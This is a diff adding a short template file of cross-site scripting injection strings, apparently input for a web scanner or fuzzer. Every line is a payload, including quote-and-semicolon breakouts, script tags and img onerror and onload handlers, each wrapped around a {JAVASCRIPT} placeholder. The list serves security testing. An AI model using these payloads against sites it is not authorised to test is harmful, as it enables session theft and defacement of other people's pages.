@@ -1,0 +1,31 @@
+";{JAVASCRIPT};"
+';{JAVASCRIPT};'
+;{JAVASCRIPT};
+";{JAVASCRIPT}//
+';{JAVASCRIPT}//
+1;{JAVASCRIPT}//
+;{JAVASCRIPT}//
+1jsadif;
+'1jsadif;
+';1jsadif;
+<script>{JAVASCRIPT}</script>
+"><script>{JAVASCRIPT}</script>
+'><script>{JAVASCRIPT}</script>
+<img src="1" onerror="{JAVASCRIPT}">
+<img src="1" onerror="{JAVASCRIPT}"
+<img src='1' onerror='{JAVASCRIPT}'>
+<img src='1' onerror='{JAVASCRIPT}'
+<img src=1 onerror={JAVASCRIPT}
+<img src=1 onerror={JAVASCRIPT}//
+"><img src="1" onerror="{JAVASCRIPT}">
+"><img src="1" onerror="{JAVASCRIPT}"
+'><img src='1' onerror='{JAVASCRIPT}'>
+'><img src='1' onerror='{JAVASCRIPT}'
+onerror="{JAVASCRIPT}"
+onerror='{JAVASCRIPT}'
+onload="{JAVASCRIPT}"
+onload='{JAVASCRIPT}'
+" onerror="{JAVASCRIPT}"
+" onload="{JAVASCRIPT}"
+' onerror='{JAVASCRIPT}'
+' onload='{JAVASCRIPT}'
